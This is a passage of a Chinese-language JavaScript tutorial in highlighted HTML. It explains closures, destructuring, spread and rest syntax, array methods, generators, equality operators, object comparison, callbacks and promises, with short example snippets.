class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(greeting + <span class=\"string\">', '</span> + name);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> sayHello = createGreeter(<span class=\"string\">'Hello'</span>);</span><br><span class=\"line\">sayHello(<span class=\"string\">'Joe'</span>);</span><br><span class=\"line\"><span class=\"comment\">// Hello, Joe</span></span><br></pre></td></tr></table></figure></p>\n<p>在一个更真实的场景中，你可以设想一个初始化函数 apiConnect(apiKey)，它返回一些使用 API密钥的方法。在这种情况下，只需要提供一次 apiKey 即可。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">apiConnect</span>(<span class=\"params\">apiKey</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span>(<span class=\"params\">route</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(<span class=\"string\">`<span class=\"subst\">$&#123;route&#125;</span>?key=<span class=\"subst\">$&#123;apiKey&#125;</span>`</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">post</span>(<span class=\"params\">route, params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(route, &#123;</span><br><span class=\"line\">      method: <span class=\"string\">'POST'</span>,</span><br><span class=\"line\">      body: <span class=\"built_in\">JSON</span>.stringify(params),</span><br><span class=\"line\">        headers: &#123;</span><br><span class=\"line\">          <span class=\"string\">'Authorization'</span>: <span class=\"string\">`Bearer <span class=\"subst\">$&#123;apiKey&#125;</span>`</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123; get, post &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> api = apiConnect(<span class=\"string\">'my-secret-key'</span>);</span><br><span class=\"line\"><span class=\"comment\">// No need to include the apiKey anymore</span></span><br><span class=\"line\">api.get(<span class=\"string\">'http://www.example.com/get-endpoint'</span>);</span><br><span class=\"line\">api.post(<span class=\"string\">'http://www.example.com/post-endpoint'</span>, &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"3-解构\"><a href=\"#3-解构\" class=\"headerlink\" title=\"3. 解构\"></a>3. 解构</h2><p>JavaScript 参数解构是一种从对象中提取属性的常用方法。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'Joe'</span>,</span><br><span class=\"line\">  food: <span class=\"string\">'cake'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; name, food &#125; = obj;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(name, food);</span><br><span class=\"line\"><span class=\"comment\">// 'Joe' 'cake'</span></span><br></pre></td></tr></table></figure></p>\n<p>如果需要以其他名称来提取属性，可以使用以下格式来指定它们。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'Joe'</span>,</span><br><span class=\"line\">  food: <span class=\"string\">'cake'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"attr\">name</span>: myName, <span class=\"attr\">food</span>: myFood &#125; = obj;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(myName, myFood);</span><br><span class=\"line\"><span class=\"comment\">// 'Joe' 'cake'</span></span><br></pre></td></tr></table></figure></p>\n<p>在下面的示例中，解构被用来将 person 对象传给 introduce 函数。换句话说，解构可以（并且经常）直接用于提取传给函数的参数。如果你熟悉 React，可能已经见过这个！<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> person = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'Eddie'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">24</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">introduce</span>(<span class=\"params\">&#123; name, age &#125;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">`I'm <span class=\"subst\">$&#123;name&#125;</span> and I'm <span class=\"subst\">$&#123;age&#125;</span> years old!`</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(introduce(person));</span><br><span class=\"line\"><span class=\"comment\">// \"I'm Eddie and I'm 24 years old!\"</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-展开（spread）语法\"><a href=\"#4-展开（spread）语法\" class=\"headerlink\" title=\"4. 展开（spread）语法\"></a>4. 展开（spread）语法</h2><p>在下面的示例中，Math.max 不能直接接受 arr 数组，因为它的参数不是数组类型，但可以以数组中的各个元素作为参数。展开运算符… 可用于提取数组的各个元素。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">-1</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> max = <span class=\"built_in\">Math</span>.max(...arr);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(max);</span><br><span class=\"line\"><span class=\"comment\">// 10</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"5-变长参数（rest）语法\"><a href=\"#5-变长参数（rest）语法\" class=\"headerlink\" title=\"5. 变长参数（rest）语法\"></a>5. 变长参数（rest）语法</h2><p>你可以用它将传给函数的任意数量的参数放入数组中！<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\">...args</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(args[<span class=\"number\">0</span>] + args[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myFunc(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"comment\">// 3</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"6-数组方法\"><a href=\"#6-数组方法\" class=\"headerlink\" title=\"6. 数组方法\"></a>6. 数组方法</h2><p>JavaScript 数组方法通常可以为你提供令人难以置信的优雅方式来执行所需的数据转换。作为 StackOverflow 的贡献者，我经常看到有关如何以这种或那种方式操纵对象数组的问题。这往往是数组方法的完美用例。</p>\n<h3 id=\"map、filter、reduce\"><a href=\"#map、filter、reduce\" class=\"headerlink\" title=\"map、filter、reduce\"></a>map、filter、reduce</h3><p>map：返回一个数组，其中每个元素都使用指定函数进行过转换。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> mapped = arr.map(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el + <span class=\"number\">20</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mapped);</span><br><span class=\"line\"><span class=\"comment\">// [21, 22, 23, 24, 25, 26]</span></span><br></pre></td></tr></table></figure></p>\n<p>filter：返回一个数组，只有当指定函数返回 true 时，相应的元素才会被包含在这个数组中。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> filtered = arr.filter(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el === <span class=\"number\">2</span> || el === <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(filtered);</span><br><span class=\"line\"><span class=\"comment\">// [2, 4]</span></span><br></pre></td></tr></table></figure></p>\n<p>reduce：基于给定函数累加值。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> reduced = arr.reduce(<span class=\"function\">(<span class=\"params\">total, current</span>) =&gt;</span> total + current);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(reduced);</span><br><span class=\"line\"><span class=\"comment\">// 21</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"find、findIndex、indexOf\"><a href=\"#find、findIndex、indexOf\" class=\"headerlink\" title=\"find、findIndex、indexOf\"></a>find、findIndex、indexOf</h3><p>find：返回与指定条件匹配的第一个实例，不会继续查找其他匹配的实例。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> found = arr.find(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el &gt; <span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(found);</span><br><span class=\"line\"><span class=\"comment\">// 6</span></span><br></pre></td></tr></table></figure></p>\n<p>虽然 5 之后的元素都符合条件，但只返回第一个匹配的元素。</p>\n<p>findIndex：这与 find 几乎完全相同，但不返回第一个匹配的元素，而是返回第一个匹配元素的索引。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"string\">'Nick'</span>, <span class=\"string\">'Frank'</span>, <span class=\"string\">'Joe'</span>, <span class=\"string\">'Frank'</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> foundIndex = arr.findIndex(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el === <span class=\"string\">'Frank'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foundIndex);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure></p>\n<p>indexOf：与 findIndex 几乎完全相同，但它的参数不是一个函数，而是一个简单的值。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"string\">'Nick'</span>, <span class=\"string\">'Frank'</span>, <span class=\"string\">'Joe'</span>, <span class=\"string\">'Frank'</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> foundIndex = arr.indexOf(<span class=\"string\">'Frank'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foundIndex);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"push、pop、shift、unshift\"><a href=\"#push、pop、shift、unshift\" class=\"headerlink\" title=\"push、pop、shift、unshift\"></a>push、pop、shift、unshift</h3><p>push：这是一个相对简单的方法，它将一个项添加到数组的末尾。它就地修改数组，函数本身会返回添加到数组中的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> pushed = arr.push(<span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, 4, 5]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(pushed);</span><br><span class=\"line\"><span class=\"comment\">// 5</span></span><br></pre></td></tr></table></figure></p>\n<p>pop：从数组中删除最后一项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> popped = arr.pop();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(popped);</span><br><span class=\"line\"><span class=\"comment\">// 4</span></span><br></pre></td></tr></table></figure></p>\n<p>shift：从数组中删除第一个项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> shifted = arr.shift();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [2, 3, 4]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(shifted);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure></p>\n<p>unshift：将一个或多个元素添加到数组的开头。同样，它也是就地修改数组。与其他方法不同的是，函数本身返回数组最新的长度。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> unshifted = arr.unshift(<span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [5, 6, 7, 1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(unshifted);</span><br><span class=\"line\"><span class=\"comment\">// 7</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"splice、slice\"><a href=\"#splice、slice\" class=\"headerlink\" title=\"splice、slice\"></a>splice、slice</h3><p>splice：通过删除或替换现有元素或者添加新元素来修改数组的内容。这个方法也是就地修改数组。</p>\n<p>下面的代码示例的意思是：在数组的位置 1 上删除 0 个元素，并插入 b。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"string\">'a'</span>, <span class=\"string\">'c'</span>, <span class=\"string\">'d'</span>, <span class=\"string\">'e'</span>];</span><br><span class=\"line\">arr.splice(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"string\">'b'</span>)</span><br></pre></td></tr></table></figure></p>\n<p>slice：从指定的起始位置和结束位置之前返回数组的浅拷贝。如果未指定结束位置，则返回数组的其余部分。这个方法不会修改数组，只是返回所需的子集。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"string\">'a'</span>, <span class=\"string\">'b'</span>, <span class=\"string\">'c'</span>, <span class=\"string\">'d'</span>, <span class=\"string\">'e'</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> sliced = arr.slice(<span class=\"number\">2</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(sliced);</span><br><span class=\"line\"><span class=\"comment\">// ['c', 'd']</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// ['a', 'b', 'c', 'd', 'e']</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"sort\"><a href=\"#sort\" class=\"headerlink\" title=\"sort\"></a>sort</h3><p>sort：根据提供的函数对数组进行排序。这个方法就地修改数组。如果函数返回负数或 0，则顺序保持不变。如果返回正数，则交换元素顺序。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">3</span>, <span class=\"number\">-1</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> sorter = <span class=\"function\">(<span class=\"params\">firstEl, secondEl</span>) =&gt;</span> firstEl - secondEl;</span><br><span class=\"line\">arr.sort(sorter);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [-1, 1, 2, 3, 5, 7, 7]</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"7-生成器\"><a href=\"#7-生成器\" class=\"headerlink\" title=\"7. 生成器\"></a>7. 生成器</h2><p>看到 * 不要害怕。生成器函数指定下一次调用 next() 时会生成什么 value。既可以生成有限数量的 value（最后调用 next() 会返回 undefined），也可以使用循环生成无限数量的 value。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">greeter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"string\">'Hi'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"string\">'How are you?'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"string\">'Bye'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> greet = greeter();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 'Hi'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 'How are you?'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 'Bye'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure></p>\n<p>使用生成器生成无限个值：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">idCreator</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> i++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> ids = idCreator();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ids.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ids.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ids.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"comment\">// etc...</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"8-与\"><a href=\"#8-与\" class=\"headerlink\" title=\"8. === 与 ==\"></a>8. === 与 ==</h2><p>一定要知道 JavaScript 中 === 运算符和 == 运算符之间的区别！== 运算符在比较之前会进行类型转换，而 === 运算符在比较之前不会进行类型转换。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">0</span> == <span class=\"string\">'0'</span>);</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">0</span> === <span class=\"string\">'0'</span>);</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"9-对象比较\"><a href=\"#9-对象比较\" class=\"headerlink\" title=\"9. 对象比较\"></a>9. 对象比较</h2><p>JavaScript 新手容易犯的一个错误是直接比较对象。变量一般是指向内存中对象的引用，而不是对象本身！比较对象的一种方法是将它们转换成 JSON 字符串。但这样做有一个缺点：无法保证对象属性的顺序！一种更安全的方法是使用专门进行深度对象比较的库（例如 lodash 的 isEqual，<a href=\"https://lodash.com/docs#isEqual）。\" target=\"_blank\" rel=\"noopener\">https://lodash.com/docs#isEqual）。</a></p>\n<p>下面的对象看起来相同，但它们实际上指向不同的引用。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> joe1 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> joe2 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(joe1 === joe2);</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure></p>\n<p>相反，下面的结果为 true，因为使用其中一个对象为另一个对象赋值，它们都指向相同的引用（内存中只有一个对象）。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> joe1 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> joe2 = joe1;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(joe1 === joe2);</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"10-回调函数\"><a href=\"#10-回调函数\" class=\"headerlink\" title=\"10. 回调函数\"></a>10. 回调函数</h2><p>很多人都被 JavaScript 回调函数吓倒了！它们其实很简单，请看下面的例子。console.log 函数作为回调传给 myFunc，并在 setTimeout 完成时执行。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\">text, callback</span>) </span>&#123;</span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    callback(text);</span><br><span class=\"line\">  &#125;, <span class=\"number\">2000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myFunc(<span class=\"string\">'Hello world!'</span>, <span class=\"built_in\">console</span>.log);</span><br><span class=\"line\"><span class=\"comment\">// 'Hello world!'</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"11-promise\"><a href=\"#11-promise\" class=\"headerlink\" title=\"11. promise\"></a>11. promise</h2><p>一旦你理解了 JavaScript 回调，很快就会发现自己陷入了“回调地狱”中。这个时候可以使用 promise！将异步逻辑包装在 promise 中，使用“then”来处理成功的情况，使用“catch”来处理异常。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 